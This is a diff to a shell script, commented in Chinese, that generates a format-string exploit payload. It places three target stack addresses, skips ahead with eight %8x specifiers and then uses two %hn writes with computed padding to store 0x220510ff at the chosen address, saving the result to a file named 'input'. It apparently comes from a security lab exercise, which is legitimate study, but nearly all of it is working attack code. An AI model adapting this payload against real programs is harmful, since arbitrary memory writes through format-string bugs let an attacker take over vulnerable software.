@@ -4,23 +4,34 @@
 ADDR="\x64\xe9\xff\xbf"
 ADDR_PLUS_2="\x66\xe9\xff\xbf"
 
+# 写入的目标值（0x220510ff）
 # 低2字节和高2字节
-LOW_BYTES=4351  # 0x10ff
-HIGH_BYTES=8709 # 0x2205
+LOW_BYTES=$((0x10ff))  # 4351 
+HIGH_BYTES=$((0x2205)) # 8709
 
-# 计算已经输出的字节数（估算，需要根据实际情况调整）
-# 3个地址（12字节）+ 偏移格式符产生的输出
-BASE_OUTPUT=12
+# 计算已经输出的字节数
+# 3个地址共12字节 + 8个%8x格式符（每个输出8字节）= 12 + 8*8 = 76
+ADDR_SIZE=12
+FORMATTERS_OUTPUT=$((8 * 8))  # 8个%8x，每个输出8个字符
+BASE_OUTPUT=$((ADDR_SIZE + FORMATTERS_OUTPUT))
 
-# 为低2字节计算需要的宽度
+# 计算填充所需的数值
 LOW_PADDING=$((LOW_BYTES - BASE_OUTPUT))
+# 如果低字节值小于已输出字节，需要增加一个周期 (0x10000)
+if [ $LOW_PADDING -lt 0 ]; then
+    LOW_PADDING=$((LOW_PADDING + 0x10000))
+fi
 
-# 计算高2字节与低2字节的增量
+# 计算高2字节的增量（从低字节写入后到高字节所需增加的数值）
 INCREMENT=$((HIGH_BYTES - LOW_BYTES))
+# 如果高字节小于低字节，需要增加一个周期
+if [ $INCREMENT -lt 0 ]; then
+    INCREMENT=$((INCREMENT + 0x10000))
+fi
 
-# 构造格式化字符串
-# 1. 放入3个地址
-# 2. 使用%x偏移到第11个单元
-# 3. 写入低2字节
-# 4. 写入高2字节
-echo $(printf "${ADDR}${ADDR}${ADDR_PLUS_2}").%x.%x.%x.%x.%x.%x.%x.%x.%.${LOW_PADDING}u%%hn%.${INCREMENT}u%%hn > input
+# 构造格式化字符串，遵循参考示例的格式
+echo $(printf "${ADDR}${ADDR}${ADDR_PLUS_2}").%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x%.${LOW_PADDING}u%%hn%.${INCREMENT}u%%hn > input
+
+# 显示最终生成的命令（不执行）以便检查
+echo "生成的命令:"
+echo "echo \$(printf \"${ADDR}${ADDR}${ADDR_PLUS_2}\").%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x%.${LOW_PADDING}u%hn%.${INCREMENT}u%hn > input"
